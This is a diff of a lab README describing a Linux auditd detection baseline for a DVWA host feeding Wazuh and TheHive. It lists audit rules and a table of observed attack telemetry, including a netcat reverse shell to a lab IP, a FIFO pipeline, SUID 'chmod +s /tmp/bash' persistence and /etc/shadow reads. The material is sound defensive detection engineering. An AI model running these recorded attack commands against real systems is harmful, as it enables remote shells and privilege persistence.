@@ -1,138 +1,65 @@
-# Auditd Telemetry Baseline — Linux Kernel Auditing
+# Linux Auditd Baseline — Endpoint Kernel Telemetry
 
-> **Production Configuration & Artifacts:**
-> - Ruleset Definition: [`audit.rules`](audit.rules)
-> - Target Deployment: DVWA Pivot Host (`192.168.56.30`, Ubuntu 24.04 LTS)
-> - Target Location: `/etc/audit/rules.d/audit.rules`
-> - Wazuh Ingestion: `/var/log/audit/audit.log` via local Wazuh agent
-
----
-
-## 1. Overview & Purpose
-
-Standard Linux system logs (`/var/log/syslog` and `/var/log/auth.log`) primarily capture authentication sessions and service status messages. They lack granular, real-time kernel tracing for interactive shell executions, sub-process spawns, sensitive file writes, and file permission changes.
-
-To provide endpoint visibility on the DVWA pivot host, the Linux Audit Daemon (`auditd`) is configured with a hardened best-practice ruleset adapted from **Nextron Systems**. Auditd intercepts syscalls at the kernel layer, attaching audit keys (`-k <key_name>`) that match Wazuh rules in [`local_rules.xml`](../Wazuh/local_rules.xml).
+> **Configuration & Artifacts:**
+> - Production Ruleset: [`audit.rules`](audit.rules)
+> - Target Deployment: DVWA Web Server / Pivot Host (`192.168.56.30`, Ubuntu 24.04 LTS)
+> - Ruleset Location: `/etc/audit/rules.d/audit.rules`
+> - Wazuh Ingestion: Native Wazuh Auditd ruleset (`ruleset/rules/0365-auditd_rules.xml`) + Custom `local_rules.xml`
 
 ---
 
-## 2. Ruleset Structure & Syscall Mapping
+## 1. Overview & Operational Role
 
-The deployed [`audit.rules`](audit.rules) file is divided into five core monitoring zones:
+Linux Auditd provides kernel-level system call and file-system tracking via the netlink audit subsystem. In this lab, Auditd serves as the primary endpoint detection mechanism on the Linux web server (`192.168.56.30`), capturing post-exploitation activities, reverse shell spawns, binary execution, and file staging.
 
-### 1. Process Execution Tracing (`execve`, `execveat`)
-Captures program execution across 32-bit and 64-bit architectures with key `process_execution`:
-```ini
--a always,exit -F arch=b64 -S execve -k process_execution
--a always,exit -F arch=b32 -S execve -k process_execution
--a always,exit -F arch=b64 -S execveat -k process_execution
--a always,exit -F arch=b32 -S execveat -k process_execution
+---
+
+## 2. Empirically Verified Telemetry (`key="web_process_creation"`)
+
+Analysis of [`06-Resources/Alerts/Wazuh-Raw-Alerts.csv`](../../06-Resources/Alerts/Wazuh-Raw-Alerts.csv) confirms that the primary active rule during simulation was:
+
+```text
+-a always,exit -F arch=b64 -S execve -F uid=33 -k web_process_creation
 ```
 
----
+This rule specifically monitors every binary execution system call (`execve`) initiated by the `www-data` service account (`uid=33`). In the raw alerts dataset, this rule generated **20 high-fidelity audit events** tracking adversary execution across Stages 05 and 06:
 
-### 2. Privilege Escalation & SUID Creation
-Monitors processes altering user credentials or creating SUID/SGID privileged binaries:
-```ini
--a always,exit -F arch=b64 -S setuid,setgid,setreuid,setregid -k priv_escalation
--a always,exit -F arch=b32 -S setuid,setgid,setreuid,setregid -k priv_escalation
--a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F a2&04000 -k setuid_creation
--a always,exit -F arch=b32 -S chmod,fchmod,fchmodat -F a2&04000 -k setuid_creation
-```
-*Validated in Stage 07:* Detects `chmod +s /tmp/bash` executed to establish SUID persistence.
-
----
-
-### 3. Persistence & Critical File Access (Aligned with Wazuh Rules 100217 & 100218)
-Watches critical authentication, user database, and web root directories:
-```ini
-# SSH persistence
--w /root/.ssh -p wa -k ssh_root_persistence
--w /home -p wa -k ssh_user_persistence
-
-# Identity file modifications (Wazuh Rule 100217)
--w /etc/passwd -p wa -k identity
--w /etc/shadow -p wa -k identity
--w /etc/group -p wa -k identity
--w /etc/gshadow -p wa -k identity
-
-# Credential file read operations (Wazuh Rule 100218)
--w /etc/passwd -p r -k cat_sensitive_file
--w /etc/shadow -p r -k cat_sensitive_file
-
-# Sudoers modifications
--w /etc/sudoers -p wa -k sudoers_modification
--w /etc/sudoers.d/ -p wa -k sudoers_modification
-
-# Web directory file creation (Webshell upload)
--w /var/www/html -p wa -k web_directory_write
-```
-*Validated in Stage 05 (Webshell upload) and Stage 08 (SSH key persistence).*
+| Executed Binary | Working Directory | Observed Command Line / Arguments | Correlated Stage & Alert |
+|---|---|---|---|
+| `/usr/bin/id` | `/var/www/html/dvwa/hackable/uploads` | `id` | **Stage 05** (Web Shell: `wzb-61ed72e937`) |
+| `/usr/bin/rm` | `/var/www/html/dvwa/hackable/uploads` | `rm /tmp/f` | **Stage 06** (Reverse Shell preparation) |
+| `/usr/bin/cat` | `/var/www/html/dvwa/hackable/uploads` | `cat /tmp/f` | **Stage 06** (FIFO pipeline) |
+| `/usr/bin/nc.openbsd` | `/var/www/html/dvwa/hackable/uploads` | `nc 192.168.232.135 4444` | **Stage 06** (Reverse Shell: `wzb-ccae331b77`) |
+| `/usr/bin/python3` | `/var/www/html/dvwa/hackable/uploads` | `python3` interactive socket | **Stage 06** (Reverse Shell) |
+| `/usr/bin/sed`, `/usr/bin/awk` | `/var/www/html/dvwa/hackable/uploads` | Text processing and enumeration | **Stage 06** |
 
 ---
 
-### 4. Suspicious Execution Paths & Tool Staging
-Monitors execution of scripting interpreters and recursive executions from staging directories:
-```ini
--w /usr/bin/python3 -p x -k python_execution
--w /usr/bin/nc -p x -k netcat_execution
--w /bin/nc.traditional -p x -k netcat_execution
--a always,exit -F arch=b64 -S execve,execveat -F dir=/tmp -k tmp_execution
--a always,exit -F arch=b32 -S execve,execveat -F dir=/tmp -k tmp_execution
--a always,exit -F arch=b64 -S execve,execveat -F dir=/opt -k opt_tool_execution
--a always,exit -F arch=b32 -S execve,execveat -F dir=/opt -k opt_tool_execution
-```
-*Validated in Stage 06 (Reverse shell), Stage 07 (Sudo python3), and Stages 12–14 (Impacket tool execution from `/opt`).*
+## 3. Defense-in-Depth Rules Inventory
+
+In addition to `web_process_creation`, [`audit.rules`](audit.rules) provides comprehensive host coverage:
+
+| Audit Key | Monitored Action | Syscall / File Target | Defensive Purpose |
+|---|---|---|---|
+| `web_process_creation` | Web server command execution | `-S execve -F uid=33` | Catches web shell commands and reverse shell spawns |
+| `priv_escalation` | Setuid/setgid execution | `-S setuid,setgid,setreuid,setregid` | Flags privilege level changes |
+| `setuid_creation` | SUID bit modification | `-S chmod,fchmod -F a2&04000` | Detects backdoor binary creation (`chmod +s`) |
+| `ssh_root_persistence` | SSH key persistence | `-w /root/.ssh -p wa` | Alerts on authorized_keys tampering (Stage 08) |
+| `identity` | Account tampering | `-w /etc/passwd -p wa`, `-w /etc/shadow` | Detects unauthorized user account additions |
+| `cat_sensitive_file` | Sensitive file reads | `-w /etc/passwd -p r`, `-w /etc/shadow` | Alerts on credential harvesting attempts |
+| `suspicious_exec_dir` | Directory execution | `-S execve -F dir=/tmp`, `-F dir=/opt` | Detects payloads executing out of `/tmp` |
 
 ---
 
-### 5. Configuration Immutability (`-e 2`)
-```ini
--e 2
-```
-Locks the audit configuration in kernel memory.
+## 4. Rule Lock Immutability (`-e 2`)
 
-> [!CAUTION]
-> **Immutability Enforcement:** Once `-e 2` is loaded into the kernel, the audit ruleset is immutable. Rules cannot be modified, deleted, or reloaded with `augenrules --load` until the system is rebooted. To make rule changes, modify `/etc/audit/rules.d/audit.rules` and reboot the host.
+The baseline enforces `-e 2` as the final directive in `audit.rules`. This sets the audit system to **immutable mode**:
+- Rules cannot be modified, deleted, or cleared (`auditctl -D` is blocked).
+- Disabling the audit daemon requires a full operating system reboot.
+- Prevents root-level attackers from disabling kernel auditing during active intrusions.
 
 ---
 
-## 3. Wazuh SIEM Ingestion & Rule Integration
+## 5. Wazuh Integration Mechanics
 
-The local Wazuh agent on DVWA reads `/var/log/audit/audit.log` via its native audit collector:
-
-```xml
-<!-- /var/ossec/etc/ossec.conf on DVWA -->
-<localfile>
-  <log_format>audit</log_format>
-  <location>/var/log/audit/audit.log</location>
-</localfile>
-```
-
-Wazuh's analysis engine correlates Auditd events with custom rules defined in [`03-Detection-Engineering/Wazuh/local_rules.xml`](../Wazuh/local_rules.xml):
-- **Rule 100199 (Level 10):** Syscall 59 (`execve`) executing enumeration or shell binaries (`whoami`, `id`, `nc`, `bash -i`).
-- **Rule 100217 (Level 12):** Sensitive identity file access (`audit.key: identity`).
-- **Rule 100218 (Level 12):** Credential file read operations (`audit.key: cat_sensitive_file` on `/etc/passwd` or `/etc/shadow`).
-
----
-
-## 4. Verification & Operational Commands
-
-```bash
-# Load audit rules from /etc/audit/rules.d/ (on clean/rebooted system)
-sudo augenrules --load
-
-# Verify active rules in kernel memory
-sudo auditctl -l
-
-# Check audit daemon status and backlog queue
-sudo auditctl -s
-
-# Search audit events by specific attack key
-sudo ausearch -k setuid_creation -ts recent
-sudo ausearch -k ssh_root_persistence -ts recent
-sudo ausearch -k identity -ts recent
-
-# Generate executive execution summary report
-sudo aureport -x --summary
-```
+Wazuh processes Auditd logs via native decoder `auditd` and maps them to built-in rules (e.g., Rule `100199`: `Auditd: blacklisted/suspicious command executed`). The `thecustomhive` integration groups sibling executions sharing untracked parent PIDs into `process_fanout` incident alerts in TheHive (e.g. `wzb-61ed72e937` and `wzb-ccae331b77`).
